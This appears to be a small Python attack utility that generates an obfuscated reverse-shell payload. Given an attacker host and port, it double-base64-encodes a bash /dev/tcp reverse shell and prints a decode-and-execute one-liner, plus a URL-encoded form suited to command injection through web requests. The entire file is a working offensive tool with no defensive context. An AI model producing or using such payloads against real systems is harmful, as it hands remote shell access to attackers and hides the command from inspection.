#!/usr/bin/env python3
import sys
import base64
from urllib.parse import quote

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} LHOST LPORT")
    exit(1)

s = f"bash -i >& /dev/tcp/{sys.argv[1]}/{sys.argv[2]} 0>&1"
s_b64 = base64.b64encode(base64.b64encode(s.encode())).decode()
print(f"echo {s_b64}|base64 -d|base64 -d|bash")
print(quote(f"echo {s_b64}|base64 -d|base64 -d|bash"))
